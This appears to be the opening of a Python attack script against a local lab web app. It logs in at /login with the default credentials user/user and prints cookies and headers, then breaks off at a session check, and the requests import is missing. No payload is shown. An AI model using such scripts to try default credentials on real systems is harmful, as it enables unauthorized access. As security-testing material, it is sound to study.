import re

# Target configuration
BASE_URL = "http://127.0.0.1:32997"
LOGIN_URL = f"{BASE_URL}/login"
REMIND_URL = f"{BASE_URL}/remind"

# Create session to maintain cookies
session = requests.Session()

print("="*70)
print("STEP 1: AUTHENTICATION")
print("="*70)

# Step 1: Login with user/user credentials
print("\n[+] Attempting login with credentials: user/user")
login_data = {
    'username': 'user',
    'password': 'user'
}

login_response = session.post(LOGIN_URL, data=login_data, allow_redirects=False)
print(f"[+] Login POST Status: {login_response.status_code}")
print(f"[+] Login Response Headers: {dict(login_response.headers)}")
print(f"[+] Cookie after login: {dict(session.cookies)}")

# Check if we got a valid session
if 'session' in session.cookies:
